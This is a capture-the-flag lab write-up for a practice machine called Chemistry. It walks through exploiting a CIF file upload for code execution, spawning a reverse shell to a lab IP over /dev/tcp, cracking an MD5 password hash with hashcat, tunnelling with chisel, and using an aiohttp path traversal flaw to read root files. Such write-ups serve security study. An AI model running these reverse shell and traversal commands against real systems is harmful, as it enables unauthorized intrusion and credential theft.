Author: nothin-special 
<br>
PWNED: 11/16/2024

<!-- USER -->
<!-- Initial Enumeration for user -->
## User
#### NMAP
##### **Command:** sudo nmap -sC -sV 10.10.11.38  

![chemistry_main](./images/chemistry_main.png)


##### As with all boxes, the first command that is run is 'nmap'. Of the ports that were open, port 5000 seems the most promising as it is likely a webpage that we can exploit.
<br>

#### Dashboard

![CIF_Uploaded](https://github.com/user-attachments/assets/b0137b84-fc8b-4ada-a04c-7ca2dc58ac11)


##### Upon opening the webpage in Firefox, a dashboard appears to take '.cif' files. This upload feature may be exploitable and needs to be looked at further to confirm this suspicion. For testing, I uploaded a test.cif file to ensure that the website is functioning properly before attempting to exploit it.
<br>

#### Test CIF Uploaded

![CIF_Opened](https://github.com/user-attachments/assets/5d514fb1-1def-4a8f-9847-cc3891978658)


##### This appears to be working properly as our test CIF with fake data was successfully opened.
<br>

#### Exploit POC

![CIF_Exploit](https://github.com/user-attachments/assets/1af8008c-988e-4e99-9d23-8f287cfc423c)


##### Upon searching exploits related to CIF files, the first results show an arbitrary code exection POC.
<br>

![github](https://github.com/user-attachments/assets/9a32a7f9-c426-4357-bf10-b2f489c60394)


##### This Github shows a POC file that we can use to gain a reverse shell from the upload feature, by replacing 'touch pwned' with the reverse shell command.
<br>

#### File Creation

![vuln_cif_file](https://github.com/user-attachments/assets/3346feab-e5a9-482e-8ed3-a601bf60946b)


##### My go-to for creating reverse shells is revshells.com. In this case, I went with an interactive bash shell since this is a Linux box. Initially, my shell would not work, but with some trial and error, the following is what I came up with: 
##### '/bin/bash /c 'exec /bin/bash -i &>/dev/tcp/10.10.14.12/4444 <&1'

##### It runs /bin/bash -c '' where inbetween the quotes you can put a command that will be executed. 'exec' replaces the current process running with the command following, in this case, "/bin/bash -i" which launches an interactive bash shell. "&>/dev/tcp/10.10.14.12/4444" is used to redirect standard output and standard error to the newly created network connection (reverse shell to your IP/Port). "<&1" effectively links the victim's shell input with the attacker's output.
<br>

#### Exploit

![vuln_cif_view](https://github.com/user-attachments/assets/66d4caa1-6ea0-48d0-a808-f5a35cf09149)

##### After crafting the payload, the reverse shell was created by uploading the malicious CIF file and clicking the 'View' button to run the file on the victim machine. This was caught by a Netcat listener on my machine on port 4444 gaining us access to the system as the 'app' user.

![revshell_completed](https://github.com/user-attachments/assets/75cc6f06-955f-490a-a7ef-be793a1e0845)

<br>
<br>

#### Upgrading the Reverse Shell
##### To upgrade my reverse shell, I used "python3 -c "import pty;pty.spawn('/bin/bash')" so that I could navigate a bit easier. 
<br>

#### Interesting Database File

![database_file_hash](https://github.com/user-attachments/assets/981e9fb9-5f53-4232-b5cb-fef438366b70)

##### I came accross a .db file which contained various users and hashes. There were a few users and hashes, but the one that ended up being of use was 'rosa'. 
<br>

#### Breaking the Hash
![hash identifier](https://github.com/user-attachments/assets/7ce80268-1079-4ff0-ab39-fdfb780dfa12)

##### I used 'hashes.com/en/tools/hash_identifier' to identify the type of hash that is used for the password encryption. In this case, it's MD5 which is not secure and can easily be broken.

![hashcat break md5](https://github.com/user-attachments/assets/acaebdac-3fa6-4ff8-89a6-7e79f31c9d1e)

<br>

![password cracked](https://github.com/user-attachments/assets/a300641e-de27-41fc-80dd-bf23eb17b080)

<br>

##### **Command:** hashcat -a 0 -m 0 rosa_hash /usr/share/wordlists/rockyou.txt
##### Hashcat was used to break the md5 encryption using the rockyou wordlist. The '-a 0' flag was used to set the attack mode to straight, and '-m 0' was used to set the hash type to MD5. In this case, the password was 'unicorniosrosados' which only took a few seconds to crack, and an online tool like hash killer could most likely also be used. 
<br>

#### Privilege Escalation
![rosa_ssh_session](https://github.com/user-attachments/assets/86108009-d9ae-4a1b-9441-85642860b47d)

##### Now that we have Rosa's credentials, I SSH'd into the machine as 'rosa' and prepared to escalate my privileges to 'root'. I went ahead and copied the user.txt file from the user's home directory.

![sudo-l](https://github.com/user-attachments/assets/e0d29b76-ed7c-4d8b-81e3-8e098edf63d7)

##### I ran some basic commands using my cheat sheet that I created for linux privilege escalation. The most basic being 'sudo -l', and as you can see, we cannot run anything as sudo as the rosa user. 
![netstat command](https://github.com/user-attachments/assets/2f6d5969-18fc-4917-b170-81448f0dfce9)

##### Upon running netstat to view the open ports on the machine, port 8080 is also opened on localhost. This is a common port used for alternative web services like proxies, development, and other applications. I decided to use 'chisel' to get a better view and to see if there's anything I could exploit. 

![python3 server](https://github.com/user-attachments/assets/f2c9992d-c7ee-4325-b004-d49ec15c4f24)

##### To get the chisel client on the victim machine, I used a python3 server and wget to grab my chisel file in the /tmp/ directory on the victim machine. 

![chisel client command](https://github.com/user-attachments/assets/1d9c95a0-08d1-4071-9aea-c88c0a53e952)

##### This shows the command that I used to initate a chisel client on the victim machine.
![chisel server command](https://github.com/user-attachments/assets/2f563c34-5134-4c01-8202-c2ba11cf3a1f)

##### This shows the command that I used to initate a chisel server on my attacking machine. 
![homepage of chisel server](https://github.com/user-attachments/assets/fef74199-745d-4c26-8dda-6d756c11b9cd)

<br>

![servicelist](https://github.com/user-attachments/assets/d0b738c0-2e64-428b-8b71-d582e2275e7e)

##### Going to localhost on port 8080 now shows what the webpage of the alternative web server is hosting on the victim's machine. Not a whole lot was found here, but I did go through the services and the source code to see if there was anything interesting. I attempted to use my wappalyzer extension and I ran scanning tools, like nuclei and nmap on the web service. I also used gobuster to see if there were any other hidden/interesting directories.

![nmap of aiohttp](https://github.com/user-attachments/assets/ac4d8294-06be-4c98-a72f-617bc81ee410)

##### The web server appears to be using aiohttp/3.9.1, which is great as we can search to see if it's exploitable.

![aiohttp google exploit](https://github.com/user-attachments/assets/1650e400-e6a4-4439-a9da-5f94fd96cf09)

##### Doing a quick google search shows that it's exploitable to CVE-2024-23334, which is a path traversal vulnerability. This can be used to print /etc/shadow, where the root password can be broken, or if you're lazy (but I like to say more efficient since the goal of a CTF is to get the flag), simply print /root/root.txt to show the root flag. 

![urlencoded etcpasswd](https://github.com/user-attachments/assets/06198a58-112e-43ec-b21d-7619770e23b4)

##### As you can see, if I run a url encoded path traversal curl command, it shows the contents of /etc/passwd (this has the ability to print any file as root). Note that this only works with the /assets/ directory (or at least I couldn't get it to work otherwise), which was found during the gobuster directory brute force which showed as a 403. 

![roottxtfile](https://github.com/user-attachments/assets/8f41adc2-3798-43b0-a556-3a0ec9ff7e28)

##### Nice! We printed root.txt by using the path traversal vulnerability!

<br>
<br>
